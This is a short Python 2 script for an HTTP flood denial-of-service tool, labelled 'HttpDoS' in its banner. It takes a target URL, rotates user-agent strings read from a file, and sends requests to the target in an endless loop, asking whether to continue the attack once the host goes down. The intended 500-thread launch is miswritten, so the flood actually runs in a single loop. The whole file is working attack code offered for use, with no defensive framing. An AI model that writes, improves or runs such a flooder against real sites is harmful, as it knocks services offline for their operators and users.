try:
    from thread import start_new_thread
    import pycurl, sys, platform, os, random
    from StringIO import StringIO
except ImportError:
    print 'Please install the module "pycurl"'
    exit()
def clear():
    if platform.system() == 'Windows':
        os.system('cls')
    else:
        os.system('clear')
banner = ''' _   _ _   _         ____       ____  
| | | | |_| |_ _ __ |  _ \  ___/ ___| 
| |_| | __| __| '_ \| | | |/ _ \___ \ 
|  _  | |_| |_| |_) | |_| | (_) |__) |
|_| |_|\__|\__| .__/|____/ \___/____/ 
              |_|                     '''
if len(sys.argv) >= 2:
    url = sys.argv[1]
    clear()
    print banner+'\n'
    if url.startswith('http'):
        pass
    else:
        url = 'http://'+url
else:
    print 'Usage: %s <url>' % sys.argv[0].split('\\')[len(sys.argv[0].split('\\')) -1]
    exit()
c = pycurl.Curl()
buffer = StringIO()
c.setopt(c.URL, url)
c.setopt(c.WRITEDATA, buffer)
try:
    useragentsf = open('user-agent.txt')
    useragents = useragentsf.readlines()
except:
    print 'User-agent file is missing'
    exit()
def flood(counter):
    while 1:
        try:
            ua = random.choice(useragents)
            counter +=1
            c.setopt(c.USERAGENT, ua)
            c.perform()
            sys.stdout.write('\rSending request '+str(counter)+' to '+url)
        except pycurl.error:
            print '\nHost down or unavailable'
            q = raw_input('Do you wanna continue the attack (y/n): ')
            if q.lower() == 'y':
                clear()
                pass
            else:
                exit()
try:
    counter = 0
    raw_input('Press ENTER to start attack ...')
    for i in xrange(500):
        start_new_thread(flood(counter))
except KeyboardInterrupt:
    exit()
